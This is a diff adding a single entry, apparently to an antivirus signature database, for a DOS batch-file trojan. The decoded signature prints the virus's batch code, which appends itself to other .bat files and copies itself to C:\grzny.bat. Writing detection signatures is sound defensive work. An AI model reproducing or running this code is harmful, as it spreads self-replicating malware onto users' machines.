@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36551
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off @ctty nul for %%a in (*?.b?t) do set grzny= %%a for %%b in (*?.b?t) do find "grzny" %%b if not errorlevel 1 goto grzny for %%c in (*?.b?t) do copy %%c+%0 :grzny if not exist c:\grzny.bat copy %0 c:\grzny.bat 
